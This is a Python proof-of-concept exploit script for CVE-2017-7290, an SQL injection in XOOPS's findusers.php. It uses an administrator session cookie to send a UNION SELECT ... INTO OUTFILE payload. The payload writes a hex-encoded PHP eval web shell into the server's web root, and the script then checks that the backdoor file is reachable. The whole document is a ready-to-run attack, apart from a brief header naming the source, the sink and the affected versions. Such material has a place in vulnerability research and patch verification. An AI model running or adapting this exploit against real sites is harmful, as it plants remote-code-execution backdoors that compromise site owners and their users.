#!/usr/bin/env python
#-*- coding:utf8 -*-
# Python script runtime environment : 3.6
# Powered by Tiger Lee of cnzxsoft.com <414028660@qq.com> Security Platform Department

'''
    CVE-2017-7290 POC
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7290
    In the default installation configuration, you need administrator privileges can be implemented into the attack, when the database access permissions for root, you can use this 
vulnerability to write to the server backdoor file.
    Source: findusers.php:466   Read $_POST['url']
    Sink: findusers.php:238     $result = $this->db->query($sql);
    Affected software: XOOPS 2.5.7.2 -> 2.5.8.1
    Free to modify and redistribute this program.
    Use at your own risk and you are responsible for what you are doing.
'''

import urllib.request
import urllib.parse
import time
requestHost = 'http://www.example.com/'  # Remote Url
requestUrl = requestHost + '/include/findusers.php'
requestSessionID = 'c9epb7lusi1fftasgbdj5vivv0' #Login sessionid
requestCookie = '_ga=GA1.4.132172316.1490766554; PHPSESSID=' + requestSessionID
url = 'http://www.google.com/'
filename = 'cvetest.php'
filepath = 'D:/www/' + filename #Write shell directory
payload = url+"x%') union select 0x3C3F706870206576616C28245F504F53545B7A5D293B3F3E into outfile '"+ filepath +"'#"
data = urllib.parse.urlencode({'url': payload, 'user_submit': 'Submit'})
data = data.encode('utf-8')
request = urllib.request.Request(requestUrl)
'''adding charset parameter to the Content-Type header.'''
request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
request.add_header("Cookie" , requestCookie)
f = urllib.request.urlopen(request, data)
time.sleep(1)
try:
    r = urllib.request.urlopen(requestHost + filename)
    if (r.getcode() == 200):
        print('file found!')
except:
        print('no found!')
